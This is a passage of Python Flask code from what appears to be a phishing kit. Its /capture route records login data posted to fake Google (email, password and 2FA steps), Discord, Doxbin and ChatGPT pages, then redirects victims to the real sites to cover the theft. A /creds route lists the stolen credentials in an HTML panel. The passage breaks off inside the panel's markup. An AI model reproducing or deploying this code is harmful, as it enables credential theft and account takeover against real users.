@app.route("/capture/<site>", methods=["POST"])
def capture(site):
    data = dict(request.form)
    step = data.pop("step", "")

    if site == "google":
        if step == "identifier":
            session["g_email"] = data.get("email", "")
            save(site, data, step)
            return redirect("/google/password")
        if step == "password":
            save(site, data, step)
            return redirect("/google/2fa")
        save(site, data, step)
        session.pop("g_email", None)
        return redirect("https://myaccount.google.com/")

    save(site, data)
    return redirect({
        "discord": "https://discord.com/login",
        "doxbin": "https://doxbin.org/login",
        "chatgpt": "https://chatgpt.com/",
    }.get(site, "/"))


@app.route("/creds")
def creds():
    rows = []
    if os.path.exists(LOG):
        with open(LOG, encoding="utf-8") as f:
            for line in f.readlines()[-200:][::-1]:
                try:
                    e = json.loads(line)
                except ValueError:
                    continue
                flat = " · ".join(f"{k}={v}" for k, v in e["data"].items() if v)
                rows.append(f"<tr><td>{e['ts']}</td><td>{e['site']}</td><td>{flat}</td></tr>")
    body = "".join(rows) or "<tr><td colspan=3>nessuna credenziale</td></tr>"
    return f"""<!doctype html><meta charset=utf-8><title>creds</title>
<style>body{{background:#0b0d10;color:#d7d7d7;font:12px ui-monospace,monospace;padding:20px}}
